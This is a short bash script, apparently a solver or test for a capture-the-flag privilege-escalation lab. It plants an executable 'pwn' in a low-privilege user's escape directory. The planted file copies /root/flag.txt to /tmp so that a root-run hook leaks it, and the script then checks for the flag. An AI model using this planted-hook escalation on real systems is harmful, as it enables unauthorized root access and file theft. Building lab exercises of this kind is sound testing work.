#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/rbashflag /home/lowpriv/escape/pwn
/usr/bin/python3 -c "
open(\"/home/lowpriv/escape/pwn\", \"w\").write(
    \"#!/bin/sh\\ncat /root/flag.txt > /tmp/rbashflag\\n\"
)
"
chmod +x /home/lowpriv/escape/pwn
for i in $(seq 1 45); do
  if test -r /tmp/rbashflag && grep -q FLAG /tmp/rbashflag 2>/dev/null; then
    cat /tmp/rbashflag
    exit 0
  fi
  sleep 1
done
echo "timeout waiting for rbash escape hook" >&2
exit 1
')"
assert_root_output "${out}"
